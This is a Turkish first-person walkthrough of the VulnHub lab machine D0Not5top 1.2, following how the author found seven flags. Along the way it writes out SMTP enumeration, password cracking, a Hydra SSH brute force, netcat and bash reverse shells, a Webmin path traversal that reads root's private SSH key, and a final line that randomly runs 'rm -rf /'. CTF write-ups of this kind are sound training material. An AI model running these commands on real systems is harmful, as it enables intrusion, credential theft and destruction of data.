#   D0Not5top Boot2Root Walkthrough

[D0Not5top](https://www.vulnhub.com/entry/d0not5top-12,191/)

Merhabalar bu yazıda D0Not5top 1.2 versiyonunun çözümünü göstereceğim bu benim ilk denemem o yüzden çok başarılı bir yazı olmayabilir.İdare edin artık =)

Şimdi bu makinede 7 adet flag var ki bu benim için işleri baya bir zorlaştırıyor :( Demek istediğim asıl ve en önemli amaç diğer makineler gibi bu makine **root** olmak değil.Tabi olsak fena olmazdı hani.Neyse başlayalım-->

Şimdi öncelikle ağa bir nmap taraması atıyorum.

    nmap 10.0.2.0/24 -sV
    
Sonra makinenin **10.0.2.9** ip'sine sahip olduğunu ve bol bol açık portu olduğunu görüyoruz.

![screenshot](screenshots/1.png)

Tek tek exploit aramaya başlıyorum.OpenSSH için basit bir kaç arama yapıyorum ama bulamıyorum.Smtp için bakınıyorum **smtp_enum** isimli bir şey gözüme çarpıyor.**SMTP**'nin tam olarak nasıl çalıştığını bilmediğimden baya da bir araştıyorum tabi.En son smtp_enum'un bana kullanıcı adlarını veren bir exploit olduğunu anlıyor bu kullanıcı adlarını nasıl kullanırız diye düşünmeye başlıyorum.

    msfconsole
    use auxiliary/scanner/smtp/smtp_enum
    set RHOSTS 10.0.2.9
    run

![screenshot](screenshots/2.png)

Sonra **telnet** ile bu smtp'ye bağlanılabildiğini internet araştırmaları ile buluyorum ve bağlanıyorum.

    telnet 10.0.2.9 25
    
İlginç bir interface beni karşılıyor.Burda bazı komutları deniyorum ama nafile.

![screenshot](screenshots/3.png)

Bıkmış br halde tekrar bakarken internetteki örnekler ile benim interface'imde bir farklılık görüyorum.Bağlantıdan hemen sonra çıkan welcome mesajı internette diğer smtp bağlantı örneklerinde yok yani bu interface'e özel.Anlıyorum ki bu sayıların bir önemi var.İkili ikili göründüklerinden 16'lık tabanda olabilecekleri aklıma geliyor.**Hex to Ascii** deniyorum ve bingo.

![screenshot](screenshots/4.png)

Tabi biraz düzenlenmesi gerek.Boşlukları koyuyor uygun yerleri siliyorum...

Ve ilk flagımı buluyorum :
    FL46_3:29dryf67uheht2r1dd4qppuey474svxya

Daha sonra açık olan **PowerDNS** portu ile **rpcbind**'e de bakıyorum.Bu portlar için bir kaç exploit var ama içeri girmeyi başaramadım bende fazla zorlamadan 80 portuna yöneliyorum.

İlk iş hemen tarayıcıyı açıp adrese gitmek oldu hehe =)

![screenshot](screenshots/5.png)

Tabiki hiç bir şey yok sadece okumaya çalışırken baya vakit harcadığım cesaretlendirici diyemeyeceğim bir mesaj var.

Şimdi **apache, javascript, php** ile yeterli bilgim olmadığından arkadaşlarında yardımı ile önce scannerları buluyorum.**Nikto, dirb ve owasp** kalide mevcut olanlar.**WpScan** da var ama o WordPress içinmiş.

Herneyse seni seçtim nikto diyor başlıyorum.Biraz internetten birazda man dosyasından kullanımını buluyorum.

    nikto -h 10.0.2.9
    
Basitmiş aslında derken karşıma destan gibi bir çıktı çıkıyor :(

O kadar uzunki iki parça screenshot alıyorum

![screenshot](screenshots/6.png)

![screenshot](screenshots/7.png)

Sonra bana bazı directory'lerin olduğunu, **robots.txt** dosyasında girdilerin olduğunu falan söylüyor.Bi bakayım 
diyorum bende.

![screenshot](screenshots/8.png)

Burdaki adresleri tek tek deniyorum ama ilginç bir şey bulamıyorum.Alt kısımda bir mesaj var ve bana **User-Agent** "GameTerminal" 'e her şey serbest gibisinden bir açıklama gibi görünüyor.User-Agent nasıl değiştirilir diye bakınıyorum ve mozilla'da bu iş için bir **add-on** buluyorum.

![screenshot](screenshots/9.png)

Değiştiriyorum ama hiç bir şey olmuyor :(

Daha sonra dirb'e yöneliyorum.Site adreslerine **brute-force** yapmak için kullanılıyor kendisi.Bende işe koyuluyor bir tarama başlatıyorum.

    dirb http://10.0.2.9:80

O taramaya devam ederken bende bulunan directory'leri geziyorum tarayıcı üzerinden.

/control'de garip bir index buluyorum.İçinde ayrıca /css /js /fonts klasörlerinide barındırıyor.

![screenshot](screenshots/10.png)

![screenshot](screenshots/11.png)

Şu search kısmına daha önce sağda solda gördüğüm **sqlinjection** kodlarını deniyorum ama nafile :S Mevcut resim üzerinden gidiyor indirip **binwalk, strings ve exiftool** çıktılarına bakıyorum ama yine bir şey bulamıyorum.

Sonra birde bunun kaynak kodlarına bakalım diyorum **Ctrl+U** yapıyorum.Yukarıdan aşağıya incelerken

![screenshot](screenshots/12.png)

Açık şekilde flag görünüyor.Ve böylece ikinciyide buluyoruz.

    FL46_1:urh8fu3i039rfoy254sx2xtrs5wc6767w
    
Ayrıca aşağıda kırmızı ile dikkat çeken bir yazı daha var

![screenshot](screenshots/13.png)

Tam olarak ne demeye çalıştığını çözemiyorum ne yazık ki.

Sonra /control/css /control/js /control/fonts adreslerine tek tek gidiyor iyice didikliyorum :) 

![screenshot](screenshots/14.png)

/control/js içinde garip bir Readme var onu açıyorum.

![screenshot](screenshots/15.png)

de görüldüğü üzere bir sağında solunda MadBro yazan bir mesaj var.Benden bir dahaki sefere /etc/host'umu değiştirip gelmemi istiyor.Ayrıca altta flag gibi görünen bir mesaj var.Mesaj da bazı kısımlar ikili tabanda görünüyor.Biraz deneme yaptım ama **Binary to Ascii** çalışmıyor.Sonra farkettim ki bu arkadaş sadece rakamların yerine binary kullanmış.Binary to Decimal converter yardımı ile 3 satırı ayrı ayrı çeviriyorum.

    FL46_2:39331r42q2svdfsxk9i13ry4f2srtr98h2
    
Ve üçüncüyüde bulmuş olduk.daha sonra mesajın dediği gibi /etc/host dosyamı değiştiriyorum.

![screenshot](screenshots/16.png)

Sonra adrese gidiyorum ve şöyle bir index beni karşılıyor

![screenshot](screenshots/17.png)

Arayüzü incelerken altta en son üye olan kişinin nicki **Megusta** var belki ona brute force deneriz düşüncesi geliyor aklıma.

![screenshot](screenshots/18.png)

Konu başlığında ki resme gözüm çarpıyor indirip binwalk, strings ve exiftool araçları ile bakıyorum.Ayrıca sayfa başında trollface'li bir resim var ama onu indirmeyi başaramıyorum.

![screenshot](screenshots/19.png)

**Forensic** araştırmam sonuç vermiyor ne yazık ki ve resimde bir şey bulamıyorum.

Sonra sitenin bir forum sitesi olduğunu anımsayıp üye olmaya çalışıyorum.Ama şartları kabul ettikten sonra şöyle bir hata alıyorum.

![screenshot](screenshots/20.png)

Bana admin ile iletişime geç diyor ve bir mail adresi veriyor.

    Megusta@G4M35.ctf

Dursun belki lazım olur diyip bir kenera not ediyorum.

Daha sonra anasayfaya geri dönüyorum.Burada içinde farklı bir dille ya da kriptolu bir şekilde yazılmış mesaj olan bir Forum görünüyor.

![screenshot](screenshots/21.png)

Türünü bilmediğim için bir bölümünü **google translate** veriyorum ama bir şey bulamıyorum.

Bir şey bulamayınca aklıma scannerlar geliyor ve nikto ile başlıyorum.

    nikto -h http://d0not5topme.ctf/
    
Şöyle bir çıktı alıyorum

![screenshot](screenshots/22.png)

Burada verilen tüm adreslere gidiyorum ama pek ilginç bir şey bulamıyorum.Bende birde owasp'ı deneyelim diyerek ona yöneliyorum.Kali'nin programlar menüsünden owasp-zap'ı açıyor ve target kısmına hedefin adresini giriyorum.Sonra tarama başlıyor.

Tarama devam ederken bende adreslere göz gezdiyorum bu sırada gözüme **flagfinders** gibi bir şey takılıyor detaylı baktığımda: 

![screenshot](screenshots/23.png)

Biraz daha yakınlaşalım

![screenshot](screenshots/24.png)

Burada **FLaR6yF1nD3rZ_html** gibi bir şey yazıyor.Bunu adresin sonuna ekleyip gitmeye çalıştım ve bingo.

![screenshot](screenshots/25.png)

Eğer ctf'ler ile uğraşıyorsanız ve benim gibi web sevmiyor kriptoloji ve forensic hoşunuza gidiyorsa illa görmüş olmalısınız ki bu bir **BrainFuck** metni.Hemen Brainfuck to Text diyorum google'a.Ve flagı buluyoruz.

    FL46_4:n02bv1rx5se4560984eedchjs72hsusu9
    
Bundan sonra owasp'a geri dönüp başka ne bulabiliriz diye bakıyorum ama başka bir sonuç çıkartamıyorum.

Elimde kalan seçenekler den ilki bulduğum her text yazılabilen alana sqlinjection kodları yazmak iken diğer seçenek ise bulduğumuz mail adresi.

İnternetten bulduğum bir kaç sql kodu ile denemeler yapıyorum ama bir şey çıkartamıyorum.Mail adresine dönüyorum yapabileceklerim hakkında biraz araştırma yaparken mail adresinin sonunun **.ctf** ile bittiğini görüyorum daha önce D0Not5topMe.ctf ismini /etc/hosts'un altına yazmıştık ve onun sonuda .ctf ile bitiyordu bunuda /etc/hosts'un içine yazmayı deniyorum.

![screenshot](screenshots/26.png)

Bingo!Yeni bir index daha doğrusu bir tür oyun :)

![screenshot](screenshots/27.png)

Bu noktada yapabileceğim şeylere bakıyorum.Birincisi oyunun başarıyla bitirirmek bir flagın açılmasını tetikleyebilir.İkincisi kaynak kodlarında gizlenmiş bir şeyler olabilir.Ya da owasp, nikto taramaları sonuç verebilir.Yine nikto ile başlamaya karar veriyorum.

![screenshot](screenshots/28.png)

Çıktısını alıyorum.Burdaki adreslere tek tek bakmaya başlıyorum.Ama bir şey çıkmıyor.Sonra owasp'a geçiyorum.Owasp taramasından da bir şey çıkmıyor.Bende diğer seçeneklere geçiyorum.Oyunun başarıyla bitirmeye çalışmak ilk seçeneğimiz, en olmadı hile yapmaya çalışırız diye düşünüyorum.Oyunu oynamaya başlıyorum.Qualifying bölümünde sınırsız roketiniz var.Eğer bu bölümü geçebilirseniz level 1'e geliyorsunuz ve sadece 5 roketiniz var.Eğer roketlerin hepsi bitirse Qualifying bölümüne geri dönüyorsunuz ancak tam bu sırada ekranda garip bir yazı çıkıyor.Ama dikkat edin tam kopyalacağım derken tıklarsanız benim gibi yazı kayboluyor bu yüzden bir kaç defa oyunu yeniden oynamak zorunda kalabilirsiniz ama oynaması zevkli olduğundan benim için sorun olmadı :D

Neyse kolaylık olsun diye yazıyı buraya koyuyorum

![screenshot](screenshots/29.png)

    /H3x6L64m3
    
Bir adrese benzediği için url sonuna ekliyorum.

Vee yeni bir oyun :D

![screenshot](screenshots/30.png)

Üstteki oyun için bahsettiğim senaryolar burada da geçerli sayılır diyerek oyunu oynamaya başlıyorum.Arkaplanda bazı rakamlar var ve düşerseniz yine bir uzantı görünüp kayboluyor.Kali de oyunu 10-5 fps ile oynayabildiğim için ( **Malesef =(** ) ayarları **low**'a getiriyorum böylece rakamlarda da daha iyi ayırt edilebiliyor.

![screenshot](screenshots/31.png)

Bunlar bahsettiğim rakamlar net görebilmek için biraz sürmek gerekiyor uzay aracını ilerilere doğru.

Ve son olarak eğer aşağıya düşerseniz bir kaç saniyeliğine ekranda bu beliriyor

![screenshot](screenshots/33.png)

    HTTP://T3RM1N4L.CTF
    
Önce rakamları decode etmeye sonra adrese gitmeye karar veriyorum.

Rakamları decode etmek için önce encode tipini bulmalıydım.Eğer bu bir flag ise ilk harf "F" ile başlamalıydı.Yani "\106" 'nın "F" harfine eşit olduğu bir encoding tipi olmalıydı.ASCII tablosunda octal değerler kısmında 106 "F" harfine denk geliyor.Bu şekilde octal to ASCII yardımıyla bir flagı daha bullmuş oluyoruz.

    FL46_5:09k87h6g4e25gh44wa1rybyfi898hncdu
    
Devamında ise /etc/hosts dosyasını tekrar düzenleyip taraycımın adres kısmına aldığımız url'yi yazıyorum.

![screenshot](screenshots/34.png)

Ve bir terminal ekranı beni karşılıyor.

![screenshot](screenshots/35.png)

Hemen bildiğim her komutu denemeye başlıyorum :D

![screenshot](screenshots/36.png)

Anlaşılan "password istiyor" diyerek başka çözümler düşünmeye başlıyorum.İlk yol nikto,owasp taramaları ikincisi ise kaynak koduna bakmaktı.En olmadı brute force deneyecektik.Başka yolu yoktu.

Nikto taramasından hiç bir şey bulamıyorum.Owasp'da ise /css /js uzantıları ortaya çıktı.Bu şekilde başka uzantılar olma ihtimalini düşünerek dirb'e başvuruyorum ancak Owasp'dan elde ettiklerimden fazla bir şey elde edemiyorum.

Bunun üzerinde ikinci hedefe yani kaynak kodlara yöneliyorum.Ctrl+U ile baktığımda şöyle bir ekran karşımıza çıkıyor.

![screenshot](screenshots/37.png)

Burada sitede kullanılan terminal emulatorü hakkında bilgi var bunu kullanarak açık bulma ihtimaliz var o yüzden not ediyorum.

    PHP+JQuery Temrinal Emulator by Fluidbyte
    
Bu arada "Terminal" yerine "Temrinal" yazdığı gözümden kaçmıyor :D

Ancak bu bilgilerden de malesef bir açık bulamıyorum :S

En son brute-force kalıyor yapılabilecek böylece deneme yapmaya başlıyorum ve aynı GameOfPwners yarışmasında wifi-aircrack sorusunda yaptığım gibi parolayı verilen isimle aynı giriyorum ve bingo!! :D

![screenshot](screenshots/38.png)

Komutları denemeye başlıyorum ama neredeyse her komuta bu **ERROR: Megusto ere no no!** hatayı veriyor ayrıca kısa sürede oturumu düşürüyor ve tekrar aynı parolayı soruyor :( Bu zor şartlarda uzun denemelerde sonra **grep** komutunun çalıştığını farkediyorum ve 

    grep *
    
yazıyorum.Bingo

![screenshot](screenshots/39.png)

Böylelikle M36u574.ctf isimli bir klasör olduğunu farkediyoruz.Sizinde artık alıştığınız gibi yapılacaklar belli.

/etc/hosts dosyasını ayarlayıp tarayıcıma gidiyorum.

Karşımıza sürekli değişen trollface resimleri çıkıyor.

Herhangi etkileşime geçebileceğim bir yerde olmadığından tarama safhasına geçiyorum.Önce Ctrl+U yapıyorum.

![screenshot](screenshots/40.png)

İlgi çekici bir şey bulamadığımdan her zaman yaptığım gibi dirb,nikto ve owasp taramalarını yapıyorum ama hiç bir şey çıkmıyor.

![screenshot](screenshots/41.png)

Biraz karıştırdıkdan sonra resimlerde bir şeyler olabileceği aklıma geliyor./images'in altında megusta00*.jpg(Yıldız yerinde sayılar var) resimleri var bir kaçından bir şey çıkmıyor.

Bu noktada dikkatimi ismi farklı olan başka bir resim çekiyor. /images/kingmegusta.jpg

![screenshot](screenshots/42.png)

:D

Bu resmide indiriyorum binwalk çıktısından sonuç alamasamda exiftool çıktısında resme yorum konulduğu görülüyor.

    exiftool kingmegusta.jpg
    
![screenshot](screenshots/43.png)

Yorumda yazan metnin kriptolu olduğu aşikar ve encode edilmesi lazım.

Bu kadar uzun bir hash bildiğim kadarı ile bulunmadığından hash olmadığını farzediyorum.**Root13** de olamaz gibi duruyor.**BrainFuck ya da Ook!** 'da olmadığı bariz belli.Daha sonra aklıma **Base64** olabileceği geliyor.CTF'lerde kriptloji sorularına arasıra bakıyorsanız mutlaka görmüş olmalısınız.

Taminim doğru çıkıyor.

![screenshot](screenshots/44.png)

Elde ettiğimiz şey ise yine linux ta parolanızı kaybettiyseniz ya da /etc/shadows'a bir göz attıysanız aşina olmanız gereken bir şey.
**sha512crypt $6$, SHA512 (Unix) 2**

Yani **sha512** ile hashlenmiş **MeGustaKing** isimli kullanıcının şifresi.

Sql ve web sevmeyen ben için işin en eğlenceli ve heyecanlı kısımlarında biri burasıydı açıkcası :D Hemen bu hash'i güzelce bir temizleyip şu hale getiriyorum:

$6$e1.2NcUo$96SfkpUHG25LFZfA5AbJVZjtD4fs6fGetDdeSA9HRpbkDw6y5nauwMwRNPxQnydsLzQGvYOU84B2nY/O40pZ30

Bunuda hash.txt isimli dosyaya atıyorum.Daha sonra Arch'a geçiyorum çünkü Kali üzerinde ekran kartı sürücüleri tam olarak bulunmuyor.

    hashcat -m 1800 -a 0 ~/Desktop/hash.txt ~/Desktop/wordlists/rock.txt
    
Hashcat'in normalde çalışması gerekir ancak benim bilgisayarımla ilgili olması muhtemel bir sorundan dolayı "Signature unmatched" hatası veriyor.Bende **John** 'a geçiyorum.

    john ~/Desktop/hash.txt --wordlist=~/Desktop/wordlists/rock.txt
    
Bu komut ile çalıştırdığınızda 

Warning: detected hash type "sha512crypt", but the string is also recognized as "crypt"
Use the "--format=crypt" option to force loading these as that type instead
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 64/64 OpenSSL])

Uyarısı veriyor dediğini yapıp 
    
    john ~/Desktop/hash.txt --wordlist=~/Desktop/wordlists/rock.txt --format=crypt
    
Bu komutu kullanıyoruz çünkü saf sha512 değil Unix sistemler için olanını kırmaya çalışıyoruz.Wordlist olarak da ünlü RockYou'yu seçiyorum.

Ve bingo =)

![screenshot](screenshots/45.png)

Hartırlarsanız **SSH** portu açık idi.Hemen oraya gidiyorum.

    ssh MeGustaKing@10.0.2.9
    
Diyorum Veee....

![screenshot](screenshots/46.png)

Last login:Sat Apr  1 00:00:01 2017 from R0cKy0U.7x7
Welcome to rush shell
Lets you update your FunNotes and more!

Uh0h.. u n0 burtieo
h35 da 54wltyD4w6 y0u...
Gw04w4y :(

Kısaca sen burtieo değilsin diyerek kapıyı gösteriyor.Son girişin 1 Nisanda RockYou tarafından olması dikkat çekici bizimle dalga geçiyor arkadaş :D 

Ama en azından insaflı davranıp bir aded kriptolu metin veriyor bize.

TRACE: sshPr0xy.py line:550 <CODE/>U2FsdGVkX1vv715OGrvv73vv73vv71Sa3cwTmw4Mk9uQnhjR1F5YW1adU5ISjFjVEZ2WW5sMk0zUm9kemcwT0hSbE5qZDBaV3BsZVNBS++/ve+/ve+/vWnvv704OCQmCg==</CODE>

Tahmin edebilceğiniz gibi bu bir Base64 .Sonunda **==** olması kendini hemen belli ediyor.Base64'lerde **=** bazı durumlarda algoritmayı tamamlamak için kullnılır.

![screenshot](screenshots/47.png)

Çıkan sonuç anlamsız ama başında **salted** geçiyor.Burdan yola çıkarak başta ve sondaki anlamsız karakterleri siliyor ve tekrar decode ediyorum.

![screenshot](screenshots/48.png)

Buda bana flag olarak geri dönüyor :D

    FL46_6:pqpd2jfn4ruq1obyv3thw848te67tejey
    
Kaldı bir tane ve ben baya yoruldum :( Bu kadar uzun olacağını tahmin etmiyordum.Bu noktada tam olarak elimde ipucuda kalmıyor.Geldiğim noktaya geri dönüp SSH mesajına tekrar baktığımda burtieo isimli kullanıcı ile SSH brute force yapmak geliyor aklıma.Hatırlarsanız sen o değilsin demişti.Wordlist ise tabiki RockYou.

SSH brute force için Hydra, Medusa, Ncrack gibi elimizde bol seçenek mevcut.Hydra'da karar kılıyorum.

    hydra -t 32 -l burtieo -P /usr/share/wordlists/rockyou.txt 10.0.2.9 ssh 

Gerçekten uzun(neredeyse 1 saat) bir zaman sonra buluyoruz parolayı
    
![screenshot](screenshots/49.png)

    ssh burtieo@10.0.2.9
    
Diyorum ve şu ekran beni karşılıyor.

![screenshot](screenshots/50.png)

Yayy! :D

Diyecekken sevinmekten vazgeçiyorum.

![screenshot](screenshots/51.png)

Hiç bir komutun çalışmadığı bir shelle düştüğümü farkediyorum çünkü.

Arasanız bulamazsınız böyle shell'i :(

Bu noktadan sonra yapılabilecek şeyler bir şekilde yetkimi arttırmaya çalışmak ya da komutları bir şekilde çalıştırmak.NetCat ile shell'i ; dinlediğim bir porttan kendime atmakta işe yarayabilir.Ayrıca içine düştüğüm shell :( **rbash** olarak geçiyor.İnternette bu shell ile ilgili açık bulmayıda deneyebilirim.

Bu yazdıklarımı sırası ile yapmaya ve araştırmaya başlıyorum.
    
Alttaki mükemmel site(ilaç gibi geliyor ve yetişiyor) sayesinde bir çok komut buluyorum ve hepsini deniyorum.
    
[Mükemmel-Site :P](https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells)

![screenshot](screenshots/52.png)

Burada yapmaya çalıştığım şeyler shelli bir yerlere taşımak ya da başka programlar üzerinden shell komutları çalıştırmak ama nafile.En son SSH üzerinden **ShellShock** deniyorum sitede yazıldığı üzere.İyiden iyiye sinir oluyorum baya

Ama sonunda kırılan rbash'ın çıkardığı **çaaat!** sesini kulaklarımda hissediyorum :D

![screenshot](screenshots/53.png)

ssh üzerinden komutları çalıştırmayı başarıyorum.

    ssh burtieo@10.0.2.9 pwd
    
Şeklinde bir kullanıma sahip.

Daha sonra shell'i değiştirmek için reverse shell atmayı deniyorum

    ssh burtieo@10.0.2.9 "bash -i >& /dev/tcp/10.0.2.8/8080 0>&1"
    
Diyorum ancak çıktı yönlendirmesine izin vermiyor.

![screenshot](screenshots/54.png)

Bende NetCat ile reverse shell denemeye karar veriyorum.

    ssh burtieo@10.0.2.9 "nc -e /bin/sh 10.0.2.8 1337"
    
Diyorum ve dinlemek içinde başka bir terminalde

    nc -lvp 1337
    
Yazıyorum ve Bingo artık daha kaliteli bir shell'e sahibiz.

![screenshot](screenshots/55.png)
    
Bu noktadan sonra sağı solu karştırmaya başlıyorum.Bir şekilde root yetkisine ihtiyacım vardı .Elimde ki az yetkili kullanıcı ile içerde neler yapabileceğimi tek tek bulmak mantıksız olacağı için yardımcı script kullanmaya karar veriyorum .Rastgele bir Linux Enumeration Script(Bilgi toplama Scripti) buluyorum .Asıl sorun ise bu şeyi içeri sokmak.

Script için:[Buradan](https://highon.coffee/blog/linux-local-enumeration-script/)

    wget https://highon.coffee/downloads/linux-local-enum.sh
        
Komutu ile sitede yazdığı üzere scripti bilgisayarıma çekiyorum.İçeri dosya sokmak için en mantıklı yol ssh kullanmak .**SCP** ya da **SSHFS** iş görebilirdi ama SCP daha basit olduğundan ona yöneldim. Karşı makinede eğer çalışıyorsa **wget** gibi bir şeylerde kullanılabilirdi.

    scp linux-local-enum.sh burtieo@10.0.2.9:/tmp 
    
/tmp dizini en yetkisiz kullanıcıya bile genelde açık olduğu için workspace olarak orayı belirliyorum =)

![screenshot](screenshots/56.png)

Her şey gayet yolunca gitti.

Şimdi sıra scripti çalıştırmaya geldi.Ama önce tmp dizininde garip isimli bir dizin daha olduğu görünüyor ama malesef açmaya yetkim yok(**Acaba içinde nevar =)**).Bunu bir kenera not ediyorum.

![screenshot](screenshots/57.png)

Sonra scripti çalıştırıyorum ve çıktısını "deneme" isimli dosyaya yolluyorum.

    bash linux-local-enum.sh > deneme
    cat deneme
    
Yazıyorum vee çoook uzun bir(screenshot çekmenin mantığı olmayacağı kadar) çıktı karşıma çıkıyor neredeyse vm hakkında her bilgi olsada işime yarayan bir şeyler bulamıyorum ve bunun üzerine başka bir bilgi toplama script'i bulup tekrar denemeye karar veriyorum çünkü yapılabilecek başka bir şey aklıma gelmiyordu.

    git clone https://github.com/rebootuser/LinEnum.git
    
Yardımı ile yeni bulduğum bir başka script'i çekiyorum ve karşı tarafa aynı şekilde yolluyorum.
Sonrada çalıştırıyorum tabiki.

Aynı şekilde çıktıya bakınca şu dikkat çekici bilgilere ulaşıyorum:

![screenshot](screenshots/59.png)

![screenshot](screenshots/58.png)
    
Bu bilgilerden yola çıkarak **wmstrt** 'yi çalıştırmayı deniyorum ama izin hatası alıyorum daha sonra başına **sudo** koyuyorum

    sudo wmstrt
    
ve çalıştırmayı başarıyorum.20'den geriye doğru sayıyor ve sonunda ise **D1dyaCatchaT3nK1l0? :D** mesajı ile karşılaşıyorum.Bize **10 Kilo yakalayabildin mi?** gibisinden bir şey diyor.Scripti tekrar çalıştırıyorum ve tekrar aynı şey oluyor.

![screenshot](screenshots/60.png)
    
Sağı solu karıştırıyor ama yeni bir dosya ya da izin değişikliği göremiyorum makinenin içinde.Zaten her ne tetikleniyorsa 20 saniye sürdüğü rahatça anlaşılyor.Kilo Standart birim sisteminde 1000'e tekabül ediyor.Yani verilen sayı **10000** .10000 ile linux makine arasında her hangi bir şekilde bağlantı kurmaya çalışırken bir zaman sonra başka vm çözümlerinde gördüğüm ,bazı tetikelemeler sonucu servislerin başka porta taşınması ,olayını hatırlıyorum.Hemen gidip 10000 portuna göz atıyorum.

    nmap 10.0.2.9 -sV -p 10000
    
![screenshot](screenshots/61.png)

Böylece wmstrt'nin 10000 portunu açtığını bulmuş oluyorum  ama ne yazık ki sadece 20 saniye boyunca.Bende tabiki komutu sürekli çalıştırmanın bir yolunu aramaya başlıyorum.Önce watch komutunu deniyorum ama işe yaramıyor.Bunun üzerine bu kısmı atlıyorum çünkü uzaktan bağlantılı reverse shell de bu işi yapmak ayrı bir zor ayrıca 20 saniyenin yeterli olma ihtimalide var.Birazda tembellik ediyorum sanırım ehehe :)

Herneyse Nmap çıktısı:
10000/tcp open  http    MiniServ 0.01 (Webmin httpd)
Şeklinde olduğundan hemen işe koyuluyor msfconsole'u açıp exploit aramaya koyuluyorum.

![screenshot](screenshots/62.png)

Ve tek tek denemeye başlıyorum.Ama bir sonuca varamıyorum daha sonra internet aramalarım da şöyle bir sitede **Webmin**   ile ilgili güzel bir açık buluyorum.Bu açık sayesinde root olmak için gereken **Private key** 'i çekebiliyorum.

[Buradan](https://sourceforge.net/p/webadmin/bugs/3020/)

Tekrar **sudo wmstrt** yazıyorum ve 20 saniye başlıyor.

Tarayıcıya:

    https://10.0.2.9:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/root/.ssh/id_rsa
    
URL'sinigiriyorum mozilla güvenlik uyarılarını atlıyorum ve bingo!
root'un Private Key'ini alıyorum.

![screenshot](screenshots/63.png)

Altta ki iki site ve **Dora(Okuyorsa Selamlar)**'nın yardımlarıyla Private Key'ini ele geçirdiğim bir sunucuya nasıl saldırılır sorusunun cevabını buluyor işlemleri yapmaya koyuluyorum.

[Site1](https://www.cyberciti.biz/faq/ssh-password-less-login-with-dsa-publickey-authentication/)

[Site2](https://www.tecmint.com/ssh-passwordless-login-using-ssh-keygen-in-5-easy-steps/)

Önce AES encryp key'i hash haline çevirip Brute Force saldırsı başlatıyorum.Bu iş için yine arch'a geçiyor John'nun kapısını çalıyorum.

    ssh2john id_rsa > hash
    john hash --wordlist=wordlists/rock.txt

![screenshot](screenshots/64.png) 

Parola **gustateamo**

Sonra kendi ~/.ssh dizinimin altında **config** isimli dosya oluşturup şu şekilde dolduruyorum.

![screenshot](screenshots/65.png)

geriye son bir şey kalıyor:

    ssh aucc
    
Ama yinede sevinemiyorum bu seferde şöyle bir sorunla karşılaşıyoruz ve parolayı kabul ettiremiyorum :(
    
![screenshot](screenshots/66.png) 

İnternette çözüm ararken yapmam gereken şeyin izinleri varsayılan haline getirmek olduğunu anlıyorum.

    chmod 600 ~/Desktop/id_rsa
    
Ve mutlu son

![screenshot](screenshots/67.png)

![screenshot](screenshots/68.png)

![screenshot](screenshots/68-2.png)

![screenshot](screenshots/68-3.png)

Gerçi hala flagı vermemekte direniyor arkadaş çok yorgun ve bıkkın olduğumdan ayrıca perl hakkında hiç bir şey bilmediğimden scriptin ne yaptığını anlamaya çalışmıyorum sadece encode edilmiş gibi duran textin sürekli tekrar eden(ilk 7 satır) parçasını alıyor ve decode ediyorum ve sonunda bitiyor :S

![screenshot](screenshots/69.png)

    FL46_7:9tjt86evvcywuuf774hr88eui3nus8dlk
    
Şimdi ise en güzel kısmı başlıyor. Makine üzerinde shell ruleti oynama kısmı tabiki :D

    [ $[ $RANDOM % 6 ] == 0 ] && rm -rf / || echo “Click!”
    
![screenshot](screenshots/70.png)

Ama ne yazık ki arkadaşşanslıçıkıyor intikam alamıyorum :S

Umarım beğenmişsinizdir.Dediğim gibi bu benim bu konudaki ilk deneyimim oldu o yüzden idare edin =)
































    














